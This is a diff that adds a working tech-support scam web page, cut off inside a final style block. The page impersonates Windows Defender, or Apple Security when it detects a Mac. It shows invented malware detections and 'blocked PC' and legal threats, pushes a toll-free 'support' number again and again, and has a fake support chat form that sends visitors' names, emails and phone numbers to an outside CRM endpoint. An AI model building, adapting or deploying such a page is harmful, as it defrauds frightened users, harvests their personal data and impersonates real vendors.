@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="google" value="notranslate" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>E-book</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
+
+    <!-- Add this before any jQuery code -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link href="style.css" rel="stylesheet" />
+
+    <!-- Add this script in the head section -->
+    <script>
+      function detectDevice() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isMac = /macintosh|mac os x/i.test(userAgent);
+        const isWindows = /windows|win32|win64/i.test(userAgent);
+
+        if (isMac) {
+          return "MacBook";
+        } else if (isWindows) {
+          return "Windows";
+        } else {
+          return "Windows"; // Default to Windows for other devices
+        }
+      }
+
+      // Store the device type for use throughout the page
+      const deviceType = detectDevice();
+    </script>
+
+    <!-- Add this in the head section after the detectDevice script -->
+    <style>
+      /* MacBook specific styles */
+      .main-content.mac-style {
+        background: url("macbook.png") no-repeat center center fixed; /* Add your MacBook background image */
+        background-size: contain;
+      }
+
+      .mac-style #scanOverlay .bg-white {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+      }
+
+      .mac-style #scanOverlay .bg-[#0078D4] {
+        background: linear-gradient(to right, #000000, #1a1a1a);
+      }
+
+      .mac-style .rounded-full {
+        border: 2px solid #000;
+      }
+
+      .mac-style #chatInterface {
+        background: rgba(255, 255, 255, 0.95);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+      }
+
+      .mac-style #chatInterface .bg-blue-600 {
+        background: linear-gradient(to right, #000000, #1a1a1a);
+      }
+
+      .mac-style #verificationpopup .bg-blue-600 {
+        background: linear-gradient(to right, #000000, #1a1a1a);
+      }
+
+      .mac-style button.bg-blue-600 {
+        background: #000000;
+      }
+
+      .mac-style button.bg-blue-600:hover {
+        background: #1a1a1a;
+      }
+
+      .mac-style #popupmessage {
+        background: rgba(0, 0, 0, 0.9) !important;
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Message for mobile and tablet devices -->
+    <div class="device-message">
+      <h1>Device Not Supported</h1>
+      <p>This application is only available on desktop devices.</p>
+    </div>
+
+    <!-- Main content for desktop devices -->
+    <div class="main-content container-fluid fixed-bg" id="mycanvas">
+      <audio id="backgroundMusic" autoplay loop>
+        <source src="im.mp3" type="audio/mpeg" />
+      </audio>
+
+      <!-- Modify the popup message -->
+      <div class="fixed top-0 left-1/2 transform -translate-x-1/2 bg-[#292a2d] text-white p-4 w-auto text-center z-50 hidden" id="popupmessage" style="background-color: #292a2d">
+        <p>This <span class="device-name">Windows</span> is using Counterfeit Software or a dangerous ransomware is installed and it will lock your device!</p>
+        <p>The case will be transferred to legal department, if not resolved immediately.</p>
+        <p>Please contact us immediately. A Service Representative will help you solve the problem</p>
+      </div>
+
+      <!-- Popup Overlay -->
+      <div class="fixed inset-0 bg-white w-full h-min-screen bg-opacity-100 flex items-center justify-center z-50" id="verificationpopup" onclick="closeConformationPopup()">
+        <!-- Popup Container -->
+        <div class="bg-white overflow-hidden animate-fade-in m-8">
+          <!-- Popup Header -->
+          <!-- <div class="bg-blue-600 text-white p-4 flex items-center justify-between">
+            <h3 class="text-lg font-semibold">Verification Required</h3>
+            <button class="text-white p-2 close-btn" onclick="closeConformationPopup()">✕</button>
+          </div> -->
+          <!-- Popup Body -->
+          <div class="text-center">
+            <img class="" src="order.png" />
+            <!-- <p class="text-gray-700">Are you a robot?</p> -->
+          </div>
+          <!-- Popup Footer -->
+         <!--  <div class="bg-white px-6 py-4 flex justify-center " style="">
+            <button class="bg-blue-600 text-white px-6 py-2 rounded-3xl transition-colors mr-2 " onclick="closeConformationPopup()">Continue</button>
+            <button class="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700 transition-colors ml-2" onclick="closeConformationPopup()">No</button>
+          </div> -->
+        </div>
+      </div>
+
+      <div class="fixed inset-0 flex items-center justify-center animate-fade-slide hidden" id="scanOverlay">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-3xl relative animate-fade-in overflow-hidden">
+          <!-- Header -->
+          <div class="flex items-center justify-between bg-[#0078D4] p-4 w-full border-b">
+            <div class="flex items-center justify-between bg-white text-white w-full rounded-t-lg">
+              <h2 class="text-lg font-semibold flex text-black items-center"><img src="windo.png" class="h-6 mr-2" />Windows Defender Security Center</h2>
+              <button class="text-blue-700 p-2 close-btn" onclick="closeOverlayPopup()">✕</button>
+            </div>
+          </div>
+
+          <!-- Main Content -->
+          <div class="p-6 space-y-6">
+            <div class="text-center space-y-2">
+              <div class="inline-flex items-center bg-red-100 px-4 py-2 rounded-full">
+                <svg class="w-5 h-5 text-red-600 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                </svg>
+                <span class="text-red-600 font-semibold">Severe threats found</span>
+              </div>
+              <div class="flex-1">
+                <h3 class="text-lg font-semibold text-gray-800">Contact Support</h3>
+                <p class="text-sm text-gray-600"><span class="font-bold text-gray-900" id="mobileNumber">+1 (888) 235-4504</span></p>
+              </div>
+              <h1 class="text-2xl font-bold text-gray-900 mt-2">Your device is at risk</h1>
+            </div>
+
+            <div class="flex items-center justify-center h-24">
+              <img
+                class="h-48"
+                src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/02e3ccac-2b2a-4a84-8448-cadc0acc09ee/deulbij-d64de595-c42e-4a40-9f02-b74db8def4d3.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzAyZTNjY2FjLTJiMmEtNGE4NC04NDQ4LWNhZGMwYWNjMDllZVwvZGV1bGJpai1kNjRkZTU5NS1jNDJlLTRhNDAtOWYwMi1iNzRkYjhkZWY0ZDMuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.r3L9OuBlaRIskwINWqEvM1Wz2QhTGHYGoK21jAAkTtk"
+              />
+            </div>
+            <!-- Scanning Bar -->
+            <div class="bg-gray-100 rounded-full h-4 overflow-hidden relative">
+              <div class="absolute inset-0 bg-gradient-to-r from-blue-500 to-blue-300 w-full scan-animation"></div>
+            </div>
+
+            <!-- Threat List -->
+            <div class="space-y-4">
+              <div class="flex items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
+                <div class="text-red-600 bg-red-100 p-2 rounded-full mr-4">
+                  <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                  </svg>
+                </div>
+                <div>
+                  <h3 class="font-semibold">Trojan:Win32/Skeeyah.A!rfn</h3>
+                  <p class="text-sm text-gray-600">This program is dangerous and executes commands from an attacker</p>
+                </div>
+              </div>
+
+              <div class="flex items-center p-4 bg-gray-50 rounded-lg border border-gray-200">
+                <div class="text-red-600 bg-red-100 p-2 rounded-full mr-4">
+                  <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                  </svg>
+                </div>
+                <div>
+                  <h3 class="font-semibold">PUA:Win32/InstallCore</h3>
+                  <p class="text-sm text-gray-600">Potentially unwanted application detected</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Footer -->
+          <div class="bg-gray-50 px-6 py-4 flex justify-between items-center">
+            <span class="text-sm text-gray-600">2 threats found • Last scan: Just now</span>
+            <button class="bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-[#006CBB] transition-colors flex items-center" id="fixNowBtn" onclick="closeOverlayPopup()">
+              <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
+                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+              </svg>
+              Clean Now
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <style>
+        @keyframes scan {
+          0% {
+            transform: translateX(-100%);
+          }
+          100% {
+            transform: translateX(100%);
+          }
+        }
+
+        .scan-animation {
+          animation: scan 2.5s ease-in-out infinite;
+          mask-image: linear-gradient(75deg, rgba(0, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.8) 50%, rgba(0, 0, 0, 0.2) 100%);
+        }
+      </style>
+
+      <!-- Popup Overlay -->
+      <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center animate-fade-slide hidden" id="popupOverlay">
+        <div class="bg-white shadow-lg rounded-lg w-full max-w-3xl transform -translate-y-1/2 top-1/2 absolute animate-fade-in w-[520px]">
+          <!-- Header -->
+          <div class="flex items-center justify-between bg-white text-white p-4 rounded-t-lg border-b">
+            <h2 class="text-lg font-semibold flex text-black items-center"><img src="windo.png" class="h-6 mr-2" />Windows Defender Security Center</h2>
+            <button class="text-blue-700 p-2 close-btn" onclick="closePopup()">✕</button>
+          </div>
+
+          <!-- Popup Content -->
+          <div class="p-6 text-gray-800 text-center" id="successPopupContent">
+            <h2 class="text-xl font-bold text-red-600">Security Alert!</h2>
+            <p class="mt-2 text-gray-700">Your system has been detected as compromised!</p>
+
+            <!-- Enhanced Scanning Animation -->
+            <!-- <div class="mt-4 flex justify-center">
+              <div class="relative w-16 h-16 flex items-center justify-center">
+                <div class="absolute w-full h-full border-4 border-blue-600 rounded-full animate-spin-slow"></div>
+
+                <div class="absolute w-3/4 h-3/4 border-4 border-blue-400 rounded-full animate-pulse"></div>
+
+                <div class="w-4 h-4 bg-blue-500 rounded-full shadow-lg animate-glow"></div>
+              </div>
+            </div> -->
+
+            <div class="flex items-center justify-center">
+              <img class="" src="Animation - 1738848480768.gif" />
+            </div>
+            <p class="mt-2 text-sm text-gray-500">Scanning for threats...</p>
+
+            <div id="userDetails" class="mt-4 p-3 bg-gray-100 rounded-md text-sm"></div>
+
+            <p class="mt-2 text-gray-700 font-bold">Access to this PC has been blocked for security reasons.</p>
+            <h2 class="text-xl font-bold text-red-600">Call Windows Support : +1 (888) 235-4504</h2>
+          </div>
+
+          <!-- Footer -->
+          <div class="bg-gray-100 p-4 flex justify-between rounded-b-lg">
+            <span class="text-sm text-gray-600">Threats Found: <span class="text-red-600 font-semibold">2</span></span>
+            <button class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700" onclick="closePopup()">Fix Now</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Notification Popup -->
+      <div id="notificationPopup" class="fixed bottom-5 right-5 bg-white shadow-lg rounded-lg w-80 p-4 flex items-center space-x-4 animate-fade-slide hidden">
+        <!-- Icon -->
+        <div class="flex-shrink-0">
+          <svg class="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m2-4h.01M12 2a10 10 0 100 20 10 10 0 000-20z"></path>
+          </svg>
+        </div>
+
+        <!-- Text Content -->
+        <div class="flex-1">
+          <h3 class="text-lg font-semibold text-gray-800">Contact Support</h3>
+          <p class="text-sm text-gray-600"><span class="font-bold text-gray-900" id="mobileNumber">+1 (888) 235-4504</span></p>
+        </div>
+
+        <!-- Close Button -->
+        <button class="text-gray-500 hover:text-gray-700">✕</button>
+      </div>
+
+      <!-- Tailwind CSS Animations -->
+      <style>
+        @keyframes fadeSlideIn {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+
+        @keyframes fadeSlideOut {
+          from {
+            opacity: 1;
+            transform: translateY(0);
+          }
+          to {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+        }
+
+        .animate-fade-slide {
+          animation: fadeSlideIn 0.5s ease-out forwards;
+        }
+
+        .animate-fade-slide-out {
+          animation: fadeSlideOut 0.5s ease-in forwards;
+        }
+      </style>
+
+      <!-- JavaScript for Auto-hide and Close -->
+      <script>
+        function showNotification(mobileNumber) {
+          document.getElementById("mobileNumber").textContent = mobileNumber;
+          let popup = document.getElementById("notificationPopup");
+          popup.classList.remove("hidden");
+          popup.classList.add("animate-fade-slide");
+        }
+
+        // Show the notification (Example: Replace number dynamically)
+        setTimeout(() => {
+          showNotification("+1 (888) 235-4504");
+        }, 1000);
+      </script>
+
+      <!-- Chat Interface -->
+      <div class="fixed bottom-4 right-4 w-96 bg-white rounded-lg shadow-xl z-999 overflow-hidden" id="chatInterface">
+        <!-- Chat Header -->
+        <div class="bg-blue-600 p-4 text-white flex items-center justify-between">
+          <div class="flex items-center">
+            <div class="w-10 h-10 bg-white rounded-full flex items-center justify-center mr-3">
+              <img src="windo.png" class="h-6" alt="Windows Support" />
+            </div>
+            <div>
+              <h3 class="font-semibold">Windows Support</h3>
+              <p class="text-xs text-blue-100">Online</p>
+            </div>
+          </div>
+          <button class="text-white hover:text-blue-200" onclick="toggleChat()">
+            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Chat Messages -->
+        <div class="h-106 overflow-y-auto p-4 bg-gray-50" id="chatMessages">
+          <!-- Chat Messages -->
+          <!-- System Message -->
+          <div class="flex mb-4">
+            <div class="w-8 h-8 flex items-center justify-center mr-2">
+              <img src="windo.png" class="h-4" alt="Windows Support" />
+            </div>
+            <div class="max-w-[80%]">
+              <div class="bg-white rounded-lg p-3 shadow-sm">
+                <p class="text-gray-800">Hello! Our system has detected security issues with your device. How can I assist you today?</p>
+              </div>
+              <span class="text-xs text-gray-500 mt-1">Just now</span>
+            </div>
+          </div>
+          <!-- Initial System Message -->
+          <div class="flex mb-4">
+            <div class="w-8 h-8 flex items-center justify-center mr-2">
+              <img src="windo.png" class="h-4" alt="Windows Support" />
+            </div>
+            <div class="max-w-[80%]">
+              <div class="bg-white rounded-lg p-3 shadow-sm">
+                <p class="text-gray-800">Hello! To help you better, please provide your:</p>
+                <form class="mt-2 space-y-2" id="dataForm__Popup_ba52b9f0-cdc7-43a0-8651-c3a2b84865a7">
+                  <input required type="text" name="name" id="userName" placeholder="Your Name" class="w-full px-3 py-2 rounded border focus:outline-none focus:border-blue-500 text-sm" style="pointer-events: auto; z-index: 1001" />
+                  <input required type="email" name="email" id="userEmail" placeholder="Your Email" class="w-full px-3 py-2 rounded border focus:outline-none focus:border-blue-500 text-sm" style="pointer-events: auto; z-index: 1001" />
+                  <input required type="tel" name="phone" id="userPhone" placeholder="Your Mobile Number" class="w-full px-3 py-2 rounded border focus:outline-none focus:border-blue-500 text-sm" style="pointer-events: auto; z-index: 1001" />
+                  <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded text-sm hover:bg-blue-700 transition-colors" style="pointer-events: auto; z-index: 1001">Submit</button>
+                </form>
+              </div>
+              <span class="text-xs text-gray-500 mt-1">Just now</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Chat Input -->
+        <div class="p-4 border-t hidden" id="chatInput">
+          <div class="flex items-center">
+            <input type="text" id="messageInput" placeholder="Type your message..." class="flex-1 border rounded-l-lg px-4 py-2 focus:outline-none focus:border-blue-500" />
+            <button onclick="sendMessage()" class="bg-blue-600 text-white px-6 py-2 rounded-r-lg hover:bg-blue-700 transition-colors">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js" type="text/javascript"></script>
+
+    <!-- Modify the script that runs on DOMContentLoaded -->
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        // ... existing code ...
+
+        // Apply MacBook styling if detected
+        if (deviceType === "MacBook") {
+          document.querySelector(".main-content").classList.add("mac-style");
+
+          // Update the logo
+          const logos = document.querySelectorAll('img[src="windo.png"]');
+          logos.forEach(logo => {
+            logo.src = "apple-logo.jpg"; // Add your Apple logo image
+            logo.alt = "Apple Support";
+          });
+
+          // Update security center header
+          const securityHeader = document.querySelector("h2.text-lg.font-semibold");
+          if (securityHeader) {
+            securityHeader.innerHTML = `<img src="apple-logo.jpg" class="h-6 mr-2" />Apple Security Center`;
+          }
+
+          // Update chat header
+          const chatHeader = document.querySelector("#chatInterface h3.font-semibold");
+          if (chatHeader) {
+            chatHeader.textContent = "Apple Support";
+          }
+        }
+
+        // ... rest of your existing code ...
+      });
+    </script>
+
+    <!-- Default Statcounter code for Popup https://popup.bluescreenhub.com/ -->
+    <script type="text/javascript">
+      var sc_project = 13091753;
+      var sc_invisible = 1;
+      var sc_security = "321dd5be";
+    </script>
+
+    <script type="text/javascript">
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.getElementById("dataForm__Popup_ba52b9f0-cdc7-43a0-8651-c3a2b84865a7");
+
+        if (!form) return;
+
+        form.addEventListener("submit", function (event) {
+          event.preventDefault();
+          const formData = {};
+
+          for (let element of form.elements) {
+            if (element.name) {
+              formData[element.name] = element.value;
+            }
+          }
+
+          const ajaxUrl = "https://crm.bluescreenhub.com/submit-data/ba52b9f0-cdc7-43a0-8651-c3a2b84865a7/";
+
+          fetch(ajaxUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(formData),
+          })
+            .then(response => response.json())
+            .then(data => {
+              console.log(data);
+              form.reset();
+              showPopup("We will connect soon!", "#28a745");
+            })
+            .catch(error => {
+              console.log(error.message);
+              showPopup("Submission failed. Try again!", "#dc3545");
+            });
+        });
+
+        function showPopup(message, bgColor) {
+          const popup = document.createElement("div");
+          popup.innerText = message;
+          Object.assign(popup.style, {
+            position: "fixed",
+            top: "50%",
+            left: "50%",
+            transform: "translate(-50%, -50%)",
+            background: bgColor,
+            color: "#fff",
+            padding: "15px 20px",
+            borderRadius: "5px",
+            fontSize: "35px",
+            boxShadow: "0 0 10px rgba(0, 0, 0, 0.3)",
+            zIndex: "1000",
+          });
+
+          document.body.appendChild(popup);
+
+          setTimeout(() => popup.remove(), 3000);
+        }
+      });
+    </script>
+
+    <script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+    <noscript
+      ><div class="statcounter">
+        <a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img class="statcounter" src="https://c.statcounter.com/13091753/0/321dd5be/1/" alt="Web Analytics" referrerpolicy="no-referrer-when-downgrade" /></a></div
+    ></noscript>
+    <!-- End of Statcounter Code -->
+
+    <!-- Add this to the existing script in head section -->
+    <script>
+      const messages = {
+        MacBook: {
+          title: "Apple Security Warning",
+          popupMessage: "This MacBook has detected suspicious activity that may be related to malware or unauthorized access attempts.",
+          warningTitle: "Apple Security Alert",
+          threatMessage: "Critical Security Issue Detected",
+          supportNumber: "+1 (888) 235-4504",
+          threats: [
+            {
+              name: "OSX/CryptoMiner.B",
+              description: "Cryptocurrency mining malware detected consuming system resources",
+            },
+            {
+              name: "OSX/DataExfil.A",
+              description: "Potential data exfiltration attempt detected",
+            },
+          ],
+          popupOverlay: {
+            title: "Apple Security Alert",
+            scanTitle: "Security Scan in Progress",
+            threatCount: "2 threats detected",
+            scanStatus: "Last scan: Just now",
+            threats: [
+              {
+                name: "OSX/CryptoMiner.B",
+                description: "Cryptocurrency mining malware detected consuming system resources",
+              },
+              {
+                name: "OSX/DataExfil.A",
+                description: "Potential data exfiltration attempt detected",
+              },
+            ],
+            warningMessage: "Your MacBook is at risk",
+            supportMessage: "Contact Apple Support",
+            supportNumber: "+1 (888) 235-4504",
+            buttonText: "Secure Now",
+          },
+          popupContent: {
+            title: "Apple Security Alert",
+            securityAlert: "Security Alert!",
+            systemMessage: "Your MacBook has been detected as compromised!",
+            scanningMessage: "Scanning for threats...",
+            accessMessage: "Access to this MacBook has been blocked for security reasons.",
+            supportText: "Call Apple Support : +1 (888) 235-4504",
+            threatCount: "Threats Found: 2",
+          },
+        },
+        Windows: {
+          // Keep existing Windows messages
+          title: "Microsoft-Windows-Firewall-Warning207dc2",
+          popupMessage: "This Microsoft Windows is using Counterfeit Software or a dangerous ransomware is installed and it will lock your device!",
+          warningTitle: "Windows Defender Security Center",
+          threatMessage: "Severe threats found",
+          supportNumber: "+1 (888) 235-4504",
+          threats: [
+            {
+              name: "Trojan:Win32/Skeeyah.A!rfn",
+              description: "This program is dangerous and executes commands from an attacker",
+            },
+            {
+              name: "PUA:Win32/InstallCore",
+              description: "Potentially unwanted application detected",
+            },
+          ],
+          popupOverlay: {
+            title: "Windows Defender Security Center",
+            scanTitle: "Severe threats found",
+            threatCount: "2 threats found",
+            scanStatus: "Last scan: Just now",
+            threats: [
+              {
+                name: "Trojan:Win32/Skeeyah.A!rfn",
+                description: "This program is dangerous and executes commands from an attacker",
+              },
+              {
+                name: "PUA:Win32/InstallCore",
+                description: "Potentially unwanted application detected",
+              },
+            ],
+            warningMessage: "Your device is at risk",
+            supportMessage: "Contact Support",
+            supportNumber: "+1 (888) 235-4504",
+            buttonText: "Clean Now",
+          },
+        },
+      };
+
+      // Update content based on device type
+      document.addEventListener("DOMContentLoaded", function () {
+        if (deviceType === "MacBook") {
+          // Update page title
+          // document.title = messages.MacBook.title;
+
+          // Update popup message
+          const popupMessage = document.querySelector("#popupmessage p:first-child");
+          if (popupMessage) {
+            popupMessage.textContent = messages.MacBook.popupMessage;
+          }
+
+          // Update security center header
+          const securityHeader = document.querySelector("h2.text-lg.font-semibold");
+          if (securityHeader) {
+            securityHeader.innerHTML = `<img src="apple-logo.jpg" class="h-6 mr-2" />${messages.MacBook.warningTitle}`;
+          }
+
+          // Update threat message
+          const threatMessage = document.querySelector(".text-red-600.font-semibold");
+          if (threatMessage) {
+            threatMessage.textContent = messages.MacBook.threatMessage;
+          }
+
+          // Update threat list
+          const threatList = document.querySelectorAll(".flex.items-center.p-4.bg-gray-50.rounded-lg");
+          threatList.forEach((threat, index) => {
+            if (messages.MacBook.threats[index]) {
+              const nameElement = threat.querySelector("h3.font-semibold");
+              const descElement = threat.querySelector("p.text-sm.text-gray-600");
+              if (nameElement) nameElement.textContent = messages.MacBook.threats[index].name;
+              if (descElement) descElement.textContent = messages.MacBook.threats[index].description;
+            }
+          });
+
+          // Update chat interface
+          const chatTitle = document.querySelector("#chatInterface h3.font-semibold");
+          if (chatTitle) {
+            chatTitle.textContent = "Apple Support";
+          }
+
+          // Update all support phone numbers
+          const phoneNumbers = document.querySelectorAll("#mobileNumber");
+          phoneNumbers.forEach(phone => {
+            phone.textContent = messages.MacBook.supportNumber;
+          });
+
+          // Update verification popup
+          const verificationTitle = document.querySelector("#verificationpopup h3.text-lg.font-semibold");
+          if (verificationTitle) {
+            verificationTitle.textContent = "Apple Security Verification";
+          }
+
+          // Update chat welcome message
+          const chatWelcome = document.querySelector("#chatMessages .text-gray-800");
+          if (chatWelcome) {
+            chatWelcome.textContent = "Hello! Our system has detected security issues with your MacBook. How can I assist you today?";
+          }
+
+          // Update form text
+          const formIntro = document.querySelector("#chatMessages .bg-white.rounded-lg p:first-child");
+          if (formIntro) {
+            formIntro.textContent = "To help secure your MacBook, please provide your:";
+          }
+
+          // Update all Windows/Microsoft references to Apple/MacBook
+          document.querySelectorAll(".text-gray-800, .text-gray-700, p").forEach(element => {
+            element.innerHTML = element.innerHTML.replace(/Windows/g, "Apple").replace(/Microsoft/g, "Apple");
+          });
+
+          // Update popup overlay content
+          const overlay = document.querySelector("#scanOverlay");
+          if (overlay) {
+            // Update header
+            const header = overlay.querySelector("h2.text-lg.font-semibold");
+            if (header) {
+              header.innerHTML = `<img src="apple-logo.jpg" class="h-6 mr-2" />${messages.MacBook.popupOverlay.title}`;
+            }
+
+            // Update threat message
+            const threatMessage = overlay.querySelector(".text-red-600.font-semibold");
+            if (threatMessage) {
+              threatMessage.textContent = messages.MacBook.popupOverlay.scanTitle;
+            }
+
+            // Update support section
+            const supportTitle = overlay.querySelector("h3.text-lg.font-semibold");
+            if (supportTitle) {
+              supportTitle.textContent = messages.MacBook.popupOverlay.supportMessage;
+            }
+
+            // Update warning message
+            const warningTitle = overlay.querySelector("h1.text-2xl.font-bold");
+            if (warningTitle) {
+              warningTitle.textContent = messages.MacBook.popupOverlay.warningMessage;
+            }
+
+            // Update threats
+            const threatElements = overlay.querySelectorAll(".flex.items-center.p-4.bg-gray-50.rounded-lg");
+            threatElements.forEach((threat, index) => {
+              const threatData = messages.MacBook.popupOverlay.threats[index];
+              if (threatData) {
+                const name = threat.querySelector("h3.font-semibold");
+                const desc = threat.querySelector("p.text-sm.text-gray-600");
+                if (name) name.textContent = threatData.name;
+                if (desc) desc.textContent = threatData.description;
+              }
+            });
+
+            // Update footer
+            const footerStatus = overlay.querySelector(".text-sm.text-gray-600");
+            if (footerStatus) {
+              footerStatus.textContent = `${messages.MacBook.popupOverlay.threatCount} • ${messages.MacBook.popupOverlay.scanStatus}`;
+            }
+
+            // Update button
+            const actionButton = overlay.querySelector("#fixNowBtn");
+            if (actionButton) {
+              actionButton.textContent = messages.MacBook.popupOverlay.buttonText;
+            }
+
+            // Update support number
+            const supportNumber = overlay.querySelector("#mobileNumber");
+            if (supportNumber) {
+              supportNumber.textContent = messages.MacBook.popupOverlay.supportNumber;
+            }
+          }
+
+          // Update popup content
+          const popupOverlay = document.querySelector("#popupOverlay");
+          if (popupOverlay) {
+            // Update header
+            const header = popupOverlay.querySelector("h2.text-lg.font-semibold");
+            if (header) {
+              header.innerHTML = `<img src="apple-logo.jpg" class="h-6 mr-2" />${messages.MacBook.popupContent.title}`;
+            }
+
+            // Update security alert
+            const securityAlert = popupOverlay.querySelector("h2.text-xl.font-bold.text-red-600");
+            if (securityAlert) {
+              securityAlert.textContent = messages.MacBook.popupContent.securityAlert;
+            }
+
+            // Update system message
+            const systemMessage = popupOverlay.querySelector("p.mt-2.text-gray-700");
+            if (systemMessage) {
+              systemMessage.textContent = messages.MacBook.popupContent.systemMessage;
+            }
+
+            // Update scanning message
+            const scanningMessage = popupOverlay.querySelector("p.mt-2.text-sm.text-gray-500");
+            if (scanningMessage) {
+              scanningMessage.textContent = messages.MacBook.popupContent.scanningMessage;
+            }
+
+            // Update access blocked message
+            const accessMessage = popupOverlay.querySelector("p.mt-2.text-gray-700.font-bold");
+            if (accessMessage) {
+              accessMessage.textContent = messages.MacBook.popupContent.accessMessage;
+            }
+
+            // Update support call text
+            const supportText = popupOverlay.querySelector("h2.text-xl.font-bold.text-red-600:last-child");
+            if (supportText) {
+              supportText.textContent = messages.MacBook.popupContent.supportText;
+            }
+
+            // Update threat count
+            const threatCount = popupOverlay.querySelector(".text-sm.text-gray-600");
+            if (threatCount) {
+              threatCount.innerHTML = `${messages.MacBook.popupContent.threatCount}`;
+            }
+
+            // Update button text
+            const fixButton = popupOverlay.querySelector("button.bg-blue-600");
+            if (fixButton) {
+              fixButton.textContent = "Secure Now";
+            }
+          }
+        }
+      });
+    </script>
+
+    <!-- Add MacBook-specific styles -->
+    <style>
+      .mac-style {
+        background: url("macbook.png") no-repeat center center fixed;
+        background-size: contain;
+      }
+
+      .mac-style .bg-blue-600 {
+        background: linear-gradient(to right, #000000, #1a1a1a) !important;
+      }
+
+      .mac-style .hover\:bg-blue-700:hover {
+        background: #333333 !important;
+      }
+
+      .mac-style .text-blue-600 {
+        color: #000000 !important;
+      }
+
+      .mac-style .border-blue-500 {
+        border-color: #000000 !important;
+      }
+
+      .mac-style .from-blue-500 {
+        --tw-gradient-from: #000000 !important;
+      }
+
+      .mac-style .to-blue-300 {
+        --tw-gradient-to: #333333 !important;
+      }
+
+      .mac-style #popupOverlay .bg-blue-600 {
+        background: linear-gradient(to right, #000000, #1a1a1a) !important;
+      }
+
